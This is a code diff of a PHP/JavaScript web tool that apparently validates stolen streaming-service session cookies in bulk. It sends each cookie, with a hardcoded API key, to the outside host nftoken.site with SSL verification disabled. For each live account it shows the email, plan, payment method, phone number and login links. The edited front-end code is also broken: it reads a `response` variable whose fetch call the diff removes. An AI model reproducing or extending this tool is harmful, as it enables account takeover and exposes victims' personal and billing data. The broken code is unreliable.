@@ -18,29 +18,48 @@ foreach ($cookie_files as $file) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $raw_post_data = file_get_contents('php://input');
     $json_data = json_decode($raw_post_data, true);
+
     if (isset($json_data['cookie'])) {
         $my_api_key = "NFK_cde619bfa57bd794d0e574da";
         $api_url = "https://nftoken.site/v1/api.php";
+
         $payload = json_encode([
             'key' => $my_api_key,
             'cookie' => $json_data['cookie']
         ]);
+
         $ch = curl_init($api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);   // Important sa Vercel
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);   // Dagdag
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);                 // Dagdag timeout
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
         $response = curl_exec($ch);
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curl_error = curl_error($ch);
         curl_close($ch);
+
+        // Debugging
         if ($response === false) {
             http_response_code(500);
             header('Content-Type: application/json');
-            echo json_encode(['status' => 'ERROR', 'message' => 'Connection failed']);
+            echo json_encode([
+                'status' => 'ERROR', 
+                'message' => 'Curl failed: ' . $curl_error
+            ]);
             exit;
         }
+
+        // Kung walang content pero 200 OK
+        if ($http_code == 200 && empty($response)) {
+            echo json_encode(['status' => 'ERROR', 'message' => 'Empty response from API']);
+            exit;
+        }
+
         header('Content-Type: application/json');
         echo $response;
         exit;
@@ -260,49 +279,57 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             document.getElementById('progressBar').style.width = progress + '%';
 
             try {
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie: cookies[i] })
-                });
-                const data = JSON.parse(await response.text());
+    const text = await response.text();
+    console.log("Raw API Response:", text);   // ← Mahalaga ito para makita ang problema
 
-                if (data.status === 'SUCCESS') {
-                    alive++;
-                    $('#aliveCount').text(alive);
-                    let resultHtml = `
-                    <div class="result-card glass rounded-2xl p-6" data-type="alive">
-                        <div class="flex items-center gap-3 mb-4">
-                            <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-sm font-medium">SUCCESS</span>
-                            <span class="text-xl font-semibold">${data.x_mail || 'N/A'}</span>
-                        </div>
-                        <div class="grid grid-cols-2 gap-4 text-sm">
-                            <div><strong>Plan:</strong> ${data.x_tier || 'Unknown'}</div>
-                            <div><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
-                            <div><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
-                            <div><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
-                            <div><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
-                            <div><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
-                            <div class="col-span-2"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
-                        </div>
-                        <div class="flex gap-3 mt-6">
-                            <a href="${data.x_l1 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">🖥️ PC</a>
-                            <a href="${data.x_l2 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📱 Mobile</a>
-                            <a href="${data.x_l3 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📺 TV</a>
-                        </div>
-                    </div>`;
-                    $('#resultsList').append(resultHtml);
-                } else {
-                    dead++;
-                    $('#deadCount').text(dead);
-                }
-            } catch (e) {
-                dead++;
-                $('#deadCount').text(dead);
-            }
+    let data;
+    try {
+        data = JSON.parse(text);
+    } catch(e) {
+        console.error("JSON Parse Error:", e);
+        throw new Error("Invalid JSON from server");
+    }
 
-            if (i < cookies.length - 1) await sleep(700);
-        }
+    console.log("Parsed Data:", data);   // ← Dagdag para debugging
+
+    if (data.status === 'SUCCESS') {
+        alive++;
+        $('#aliveCount').text(alive);
+        
+        let resultHtml = `
+        <div class="result-card glass rounded-2xl p-6" data-type="alive">
+            <div class="flex items-center gap-3 mb-4">
+                <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-sm font-medium">SUCCESS</span>
+                <span class="text-xl font-semibold">${data.x_mail || 'N/A'}</span>
+            </div>
+            <div class="grid grid-cols-2 gap-4 text-sm">
+                <div><strong>Plan:</strong> ${data.x_tier || 'Unknown'}</div>
+                <div><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
+                <div><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
+                <div><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
+                <div><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
+                <div><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
+                <div class="col-span-2"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
+            </div>
+            <div class="flex gap-3 mt-6">
+                <a href="${data.x_l1 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">🖥️ PC</a>
+                <a href="${data.x_l2 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📱 Mobile</a>
+                <a href="${data.x_l3 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📺 TV</a>
+            </div>
+        </div>`;
+        
+        $('#resultsList').append(resultHtml);
+    } else {
+        dead++;
+        $('#deadCount').text(dead);
+    }
+} catch (e) {
+    console.error("Fetch/Catch Error:", e);
+    dead++;
+    $('#deadCount').text(dead);
+}
+
+if (i < cookies.length - 1) await sleep(700);
 
         $('#progressText').text(`Finished! Processed ${total} cookies.`);
         $('#startBtn').show();
